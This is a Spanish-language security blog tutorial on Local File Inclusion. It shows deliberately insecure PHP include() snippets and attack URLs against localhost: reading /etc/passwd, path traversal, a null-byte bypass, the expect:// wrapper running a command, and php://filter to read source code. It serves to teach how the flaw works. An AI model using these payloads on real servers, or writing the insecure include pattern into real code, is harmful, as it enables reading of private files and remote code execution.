<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Local File Inclusion (LFI)</title>

  <link rel="shortcut icon" href="/assets/images/favicon.ico">
  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/assets/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Local File Inclusion (LFI) | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Local File Inclusion (LFI)" />
<meta name="author" content="m4teo" />
<meta property="og:locale" content="es" />
<meta name="description" content="La vulnerabilidad Local File Inclusion, LFI por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web. Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a: RCE (Remote Code Execution) XSS (Cross-Site Scripting) DoS (Denial of Service) Un ejemplo muy básico sería el siguiente script en PHP. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file); ?&gt; Script, del que podemos abusar para leer cualquier archivo del sistema, en este caso el /etc/passwd. localhost/lfi.php?filename=/etc/passwd Es importante aclarar que esta no es solo una vulnerabilidad de PHP, también está presente en otros lenguajes como lo es JSP o ASP. Directory Path Traversal Es posible que en el código, se nos limite a acceder a archivos que se ubican únicamente en una ruta preestablecida en el script, en este caso /var/www/html/. &lt;?php $file = $_GET[&#39;filename&#39;]; include(&quot;/var/www/html/&quot; . $file); ?&gt; Sin embargo, podemos “escaparnos” de la ruta preestablecida si añadimos ../ en nuestra cadena de ataque, pudiendo así listar contenido más allá de /var/www/html/. localhost/lfi.php?filename=../../../etc/passwd Null Byte De igual manera, es posible que en el código se nos limite a acceder a archivos de determinada extensión, en este caso archivos de extensión .php. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file . &quot;.php&quot;); ?&gt; De modo que cuando intentemos leer el archivo /etc/passwd, o cualquier otro archivo del sistema, lo que estaríamos leyendo en realidad sería el archivo /etc/passwd.php, el cual no existe. Sin embargo, si añadimos el nullbyte %00 al final de nuestra cadena de ataque, el .php no será tenido en cuenta, pudiendo así leer con normalidad el /etc/passwd, o cualquier otro archivo del sistema. localhost/lfi.php?filename=/etc/passwd%00 Wrappers PHP cuenta con una serie de wrappers, los cuales a menudo pueden ser abusados; por mencionar algunos tenemos: expect:// Nos permite una ejecución remota de comandos (RCE); cabe aclarar que este wrapper no está activado por defecto, por lo que no siempre será posible utilizarlo. localhost/lfi.php?filename=expect://whoami filter:// Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser Base64 o ROT13. Este wrapper resulta bastante útil si necesitamos leer un archivo en PHP, ya que recordemos, este es un lenguaje interpretado, por lo que, si intentáramos leer un archivo PHP del servidor vulnerable, lo que veríamos sería simplemente el output del script. localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=filterWrapper.php" />
<meta property="og:description" content="La vulnerabilidad Local File Inclusion, LFI por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web. Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a: RCE (Remote Code Execution) XSS (Cross-Site Scripting) DoS (Denial of Service) Un ejemplo muy básico sería el siguiente script en PHP. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file); ?&gt; Script, del que podemos abusar para leer cualquier archivo del sistema, en este caso el /etc/passwd. localhost/lfi.php?filename=/etc/passwd Es importante aclarar que esta no es solo una vulnerabilidad de PHP, también está presente en otros lenguajes como lo es JSP o ASP. Directory Path Traversal Es posible que en el código, se nos limite a acceder a archivos que se ubican únicamente en una ruta preestablecida en el script, en este caso /var/www/html/. &lt;?php $file = $_GET[&#39;filename&#39;]; include(&quot;/var/www/html/&quot; . $file); ?&gt; Sin embargo, podemos “escaparnos” de la ruta preestablecida si añadimos ../ en nuestra cadena de ataque, pudiendo así listar contenido más allá de /var/www/html/. localhost/lfi.php?filename=../../../etc/passwd Null Byte De igual manera, es posible que en el código se nos limite a acceder a archivos de determinada extensión, en este caso archivos de extensión .php. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file . &quot;.php&quot;); ?&gt; De modo que cuando intentemos leer el archivo /etc/passwd, o cualquier otro archivo del sistema, lo que estaríamos leyendo en realidad sería el archivo /etc/passwd.php, el cual no existe. Sin embargo, si añadimos el nullbyte %00 al final de nuestra cadena de ataque, el .php no será tenido en cuenta, pudiendo así leer con normalidad el /etc/passwd, o cualquier otro archivo del sistema. localhost/lfi.php?filename=/etc/passwd%00 Wrappers PHP cuenta con una serie de wrappers, los cuales a menudo pueden ser abusados; por mencionar algunos tenemos: expect:// Nos permite una ejecución remota de comandos (RCE); cabe aclarar que este wrapper no está activado por defecto, por lo que no siempre será posible utilizarlo. localhost/lfi.php?filename=expect://whoami filter:// Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser Base64 o ROT13. Este wrapper resulta bastante útil si necesitamos leer un archivo en PHP, ya que recordemos, este es un lenguaje interpretado, por lo que, si intentáramos leer un archivo PHP del servidor vulnerable, lo que veríamos sería simplemente el output del script. localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=filterWrapper.php" />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-13T00:00:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Local File Inclusion (LFI)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2021-09-13T00:00:00-04:00","datePublished":"2021-09-13T00:00:00-04:00","description":"La vulnerabilidad Local File Inclusion, LFI por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web. Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a: RCE (Remote Code Execution) XSS (Cross-Site Scripting) DoS (Denial of Service) Un ejemplo muy básico sería el siguiente script en PHP. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file); ?&gt; Script, del que podemos abusar para leer cualquier archivo del sistema, en este caso el /etc/passwd. localhost/lfi.php?filename=/etc/passwd Es importante aclarar que esta no es solo una vulnerabilidad de PHP, también está presente en otros lenguajes como lo es JSP o ASP. Directory Path Traversal Es posible que en el código, se nos limite a acceder a archivos que se ubican únicamente en una ruta preestablecida en el script, en este caso /var/www/html/. &lt;?php $file = $_GET[&#39;filename&#39;]; include(&quot;/var/www/html/&quot; . $file); ?&gt; Sin embargo, podemos “escaparnos” de la ruta preestablecida si añadimos ../ en nuestra cadena de ataque, pudiendo así listar contenido más allá de /var/www/html/. localhost/lfi.php?filename=../../../etc/passwd Null Byte De igual manera, es posible que en el código se nos limite a acceder a archivos de determinada extensión, en este caso archivos de extensión .php. &lt;?php $file = $_GET[&#39;filename&#39;]; include($file . &quot;.php&quot;); ?&gt; De modo que cuando intentemos leer el archivo /etc/passwd, o cualquier otro archivo del sistema, lo que estaríamos leyendo en realidad sería el archivo /etc/passwd.php, el cual no existe. Sin embargo, si añadimos el nullbyte %00 al final de nuestra cadena de ataque, el .php no será tenido en cuenta, pudiendo así leer con normalidad el /etc/passwd, o cualquier otro archivo del sistema. localhost/lfi.php?filename=/etc/passwd%00 Wrappers PHP cuenta con una serie de wrappers, los cuales a menudo pueden ser abusados; por mencionar algunos tenemos: expect:// Nos permite una ejecución remota de comandos (RCE); cabe aclarar que este wrapper no está activado por defecto, por lo que no siempre será posible utilizarlo. localhost/lfi.php?filename=expect://whoami filter:// Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser Base64 o ROT13. Este wrapper resulta bastante útil si necesitamos leer un archivo en PHP, ya que recordemos, este es un lenguaje interpretado, por lo que, si intentáramos leer un archivo PHP del servidor vulnerable, lo que veríamos sería simplemente el output del script. localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=filterWrapper.php","headline":"Local File Inclusion (LFI)","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Local-File-Inclusion-(LFI)/"},"url":"/es/Local-File-Inclusion-(LFI)/"}</script>
<!-- End Jekyll SEO tag -->


  <!-- Google Tag Manager -->
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
  <!-- End Google Tag Manager -->

</head>



<body>

  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
<a href="/en"><h2 class="header-link">English</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>Local File Inclusion (LFI)</h2>
  <time datetime="2021-09-13T00:00:00-04:00" class="by-line">
    
      13/09/2021
    
  </time>
  <p>La vulnerabilidad <em>Local File Inclusion</em>, <em>LFI</em> por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web.</p>

<p>Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a:</p>

<ul>
  <li>RCE (Remote Code Execution)</li>
  <li><a href="https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a> (Cross-Site Scripting)</li>
  <li>DoS (Denial of Service)</li>
</ul>

<p>Un ejemplo muy básico sería el siguiente script en <em>PHP</em>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Script, del que podemos abusar para leer cualquier archivo del sistema, en este caso el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=/etc/passwd
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/1.png" alt="" /></p>

<p>Es importante aclarar que esta no es solo una vulnerabilidad de <em>PHP</em>, también está presente en otros lenguajes como lo es <em>JSP</em> o <em>ASP</em>.</p>

<h3 id="directory-path-traversal"><a href="#header-3"></a>Directory Path Traversal</h3>

<p>Es posible que en el código, se nos limite a acceder a archivos que se ubican únicamente en una ruta preestablecida en el script, en este caso <code class="language-plaintext highlighter-rouge">/var/www/html/</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Sin embargo, podemos “escaparnos” de la ruta preestablecida si añadimos <code class="language-plaintext highlighter-rouge">../</code> en nuestra cadena de ataque, pudiendo así listar contenido más allá de <code class="language-plaintext highlighter-rouge">/var/www/html/</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=../../../etc/passwd
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/2.png" alt="" /></p>

<h3 id="null-byte"><a href="#header-3"></a>Null Byte</h3>

<p>De igual manera, es posible que en el código se nos limite a acceder a archivos de determinada extensión, en este caso archivos de extensión <code class="language-plaintext highlighter-rouge">.php</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
        <span class="k">include</span><span class="p">(</span><span class="nv">$file</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>De modo que cuando intentemos leer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, o cualquier otro archivo del sistema, lo que estaríamos leyendo en realidad sería el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd.php</code>, el cual no existe.</p>

<p>Sin embargo, si añadimos el nullbyte <code class="language-plaintext highlighter-rouge">%00</code> al final de nuestra cadena de ataque, el <code class="language-plaintext highlighter-rouge">.php</code> no será tenido en cuenta, pudiendo así leer con normalidad el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, o cualquier otro archivo del sistema.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=/etc/passwd%00
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/3.png" alt="" /></p>

<h3 id="wrappers"><a href="#header-3"></a>Wrappers</h3>

<p><em>PHP</em> cuenta con una serie de <em>wrappers</em>, los cuales a menudo pueden ser abusados; por mencionar algunos tenemos:</p>

<h3 id="expect"><a href="#header-3"></a>expect://</h3>

<p>Nos permite una ejecución remota de comandos (RCE); cabe aclarar que este <em>wrapper</em> no está activado por defecto, por lo que no siempre será posible utilizarlo.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=expect://whoami
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/4.png" alt="" /></p>

<h3 id="filter"><a href="#header-3"></a>filter://</h3>

<p>Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser <em>Base64</em> o <em>ROT13</em>.</p>

<p>Este <em>wrapper</em> resulta bastante útil si necesitamos leer un archivo en <em>PHP</em>, ya que recordemos, este es un lenguaje interpretado, por lo que, si intentáramos leer un archivo <em>PHP</em> del servidor vulnerable, lo que veríamos sería simplemente el output del script.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/5.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=filterWrapper.php
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/6.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/7.png" alt="" /></p>

</article>

      </section>
    </div>
  </div>

  

  <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>m4teo</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-524F5BE8G5', 'auto');
  ga('send', 'pageview');
</script>
  

</body>
</html>
